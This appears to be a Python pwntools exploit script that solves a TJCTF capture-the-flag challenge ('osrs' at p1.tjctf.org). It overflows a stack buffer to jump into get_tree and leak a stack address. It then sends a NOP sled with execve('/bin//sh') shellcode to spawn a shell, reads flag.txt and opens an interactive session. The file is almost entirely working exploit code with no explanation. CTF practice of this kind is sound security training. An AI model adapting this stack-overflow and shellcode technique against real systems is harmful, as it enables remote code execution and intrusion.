#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host p1.tjctf.org --port 8006
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = ELF('./osrs')
context.terminal = ['xfce4-terminal','-e']
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'p1.tjctf.org'
port = int(args.PORT or 8006)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break get_tree
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# getting the stack address
get_tree = exe.sym['get_tree']
payload = b'A'*0x110 + p32(get_tree)
io.sendline(payload)
stack = int(io.recvline_startswith("I don't have the tree")[-9:-3]) + 2**32


shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
nop = b'\x90'

payload = nop*0x110 + p32(stack+0x150) + b'\x90'*0x200 + shellcode;

io.sendline(payload)
io.sendline("cat flag.txt")
print(io.recv())
io.interactive()

